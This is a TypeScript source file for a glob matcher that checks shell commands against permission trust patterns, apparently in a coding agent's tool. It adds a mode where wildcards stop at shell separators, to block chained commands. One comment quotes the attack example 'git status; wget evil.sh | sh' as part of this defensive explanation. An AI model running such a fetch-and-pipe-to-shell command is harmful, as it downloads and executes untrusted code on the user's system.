/**
 * Minimal glob matcher for trust patterns.
 * Supports: *, **, ?, character classes [abc], [a-z], negation [!...] or [^...].
 *
 * Compiled regexes are cached so repeated calls with the same pattern
 * avoid recompilation overhead.
 */

function escapeRegex(s: string): string {
  return s.replace(/[.+^${}()|\\]/g, '\\$&');
}

// Module-level cache to avoid recompiling the same pattern on every call.
// LRU-ish eviction keeps unbounded growth in check for long-running processes.
const COMPILED_GLOB_CACHE = new Map<string, RegExp>();
const CACHE_MAX_SIZE = 2000;

// Matches nothing — `[^\s\S]` can never be satisfied. Used as the cached
// result for patterns that fail to compile (e.g. an over-long auto-trusted
// command) so one bad trust entry degrades to "no match" instead of throwing.
const NEVER_MATCH = /[^\s\S]/;

/**
 * Characters a single `*` must NOT cross when the matched subject is a shell
 * command line (WS-047).
 *
 * In a path glob, `*` meaning "anything but `/`" is correct. Applied to a
 * command it is far too generous: `git *` compiles to `git [^/]*`, which
 * matches `git status; wget evil.sh | sh`. The user wrote a pattern naming one
 * program and authorized an arbitrary chain.
 *
 * These are the characters that let a new command start, or that reach outside
 * the one being named: command separators (`;` `&` `|`, newline), substitution
 * (`` ` `` `$`), and redirection (`<` `>`). `(`/`)` are deliberately absent —
 * a subshell cannot begin without one of the separators above, so excluding
 * them buys nothing and costs false rejections.
 */
const COMMAND_WILDCARD_STOP = ';&|\\n\\r`$<>';

function getCachedGlob(pattern: string, commandSubject = false): RegExp {
  // The mode changes the compiled regex, so it must be part of the cache key —
  // otherwise the first caller's mode is served to every later one.
  const cacheKey = commandSubject ? `cmd\u0000${pattern}` : pattern;
  const cached = COMPILED_GLOB_CACHE.get(cacheKey);
  if (cached) return cached;
  if (COMPILED_GLOB_CACHE.size >= CACHE_MAX_SIZE) {
    // Evict oldest 25% when at capacity without array allocation
    let evicted = 0;
    const target = Math.floor(CACHE_MAX_SIZE / 4);
    for (const key of COMPILED_GLOB_CACHE.keys()) {
      COMPILED_GLOB_CACHE.delete(key);
      if (++evicted >= target) break;
    }
  }
  let re: RegExp;
  try {
    re = compileGlob(pattern, commandSubject);
  } catch {
    // A pathological trust pattern (over MAX_GLOB_PATTERN_LEN — e.g. a long
    // one-liner auto-trusted in YOLO/Auto mode) must NOT throw out of every
    // subsequent permission check and break unrelated commands like `true`
    // or `ls` (#20). Cache a never-matching regex so the bad entry is inert.
    re = NEVER_MATCH;
  }
  COMPILED_GLOB_CACHE.set(cacheKey, re);
  return re;
}

// Cap glob pattern length to prevent excessively long compiled regexes.
const MAX_GLOB_PATTERN_LEN = 1024;

/**
 * @param commandSubject - When true, compile for matching a shell command line
 *   rather than a path: a single `*` additionally stops at the shell
 *   separators in {@link COMMAND_WILDCARD_STOP}, and `**` is NOT a
 *   match-everything escape hatch (see below). Defaults to false, so every
 *   existing caller — file search, grep, replace, gitignore, the indexer —
 *   keeps its current semantics exactly.
 */
export function compileGlob(pattern: string, commandSubject = false): RegExp {
  if (pattern.length > MAX_GLOB_PATTERN_LEN) {
    throw new Error(`Glob pattern exceeds ${MAX_GLOB_PATTERN_LEN} characters`);
  }
  const star = commandSubject ? `[^/${COMMAND_WILDCARD_STOP}]*` : '[^/]*';
  const question = commandSubject ? `[^/${COMMAND_WILDCARD_STOP}]` : '[^/]';
  let i = 0;
  let re = '^';
  while (i < pattern.length) {
    const c = pattern[i];
    if (c === '*') {
      if (pattern[i + 1] === '*') {
        // ** matches any number of chars including /
        // For a command subject it still must not cross a separator: `**` is a
        // path idiom ("any depth"), and letting it mean "anything at all" here
        // would reintroduce the exact hole this mode closes via a two-character
        // pattern instead of a one-character one.
        re += commandSubject ? `[^${COMMAND_WILDCARD_STOP}]*` : '.*';
        i += 2;
        // Skip trailing slash so '**/x' matches 'x'
        if (pattern[i] === '/') i++;
      } else {
        // single * matches any chars except / (and, for commands, separators)
        re += star;
        i++;
      }
    } else if (c === '?') {
      re += question;
      i++;
    } else if (c === '[') {
      const closeIndex = pattern.indexOf(']', i + 1);
      if (closeIndex === -1) {
        re += '\\[';
        i++;
        continue;
      }
      let cls = '[';
      i++;
      if (pattern[i] === '!' || pattern[i] === '^') {
        cls += '^';
        i++;
      }
      while (i < pattern.length && pattern[i] !== ']') {
        const ch = pattern[i] ?? '';
        // Inside a regex class, only `]`, `\`, and `^`/`-` at boundaries need
        // escaping. We've already consumed the leading `^`; the rest are
        // literal. Escape `\` defensively and pass the rest through verbatim
        // so ranges like `a-z` continue to work.
        if (ch === '\\') {
          cls += '\\\\';
        } else if (ch === ']' || ch === '^') {
          cls += `\\${ch}`;
        } else {
          cls += ch;
        }
        i++;
      }
      cls += ']';
      re += cls;
      i++; // skip closing ]
    } else {
      re += escapeRegex(c ?? '');
      i++;
    }
  }
  re += '$';
  return new RegExp(re);
}

export function matchGlob(pattern: string, input: string): boolean {
  return getCachedGlob(pattern).test(input);
}

export function matchAny(patterns: string[], input: string): boolean {
  return patterns.some((p) => matchGlob(p, input));
}

/**
 * Match a shell command line against a trust pattern, with `*` and `**`
 * stopping at shell separators (WS-047).
 *
 * A separate entry point rather than a flag on {@link matchGlob} because the
 * two must never be confused at a call site: this is strictly NARROWER, so it
 * is correct for deciding what a pattern ALLOWS and wrong for deciding what a
 * pattern DENIES — narrowing a deny pattern un-blocks things. The caller has to
 * pick deliberately.
 */
export function matchCommandGlob(pattern: string, input: string): boolean {
  return getCachedGlob(pattern, true).test(input);
}

export function matchAnyCommand(patterns: string[], input: string): boolean {
  return patterns.some((p) => matchCommandGlob(p, input));
}
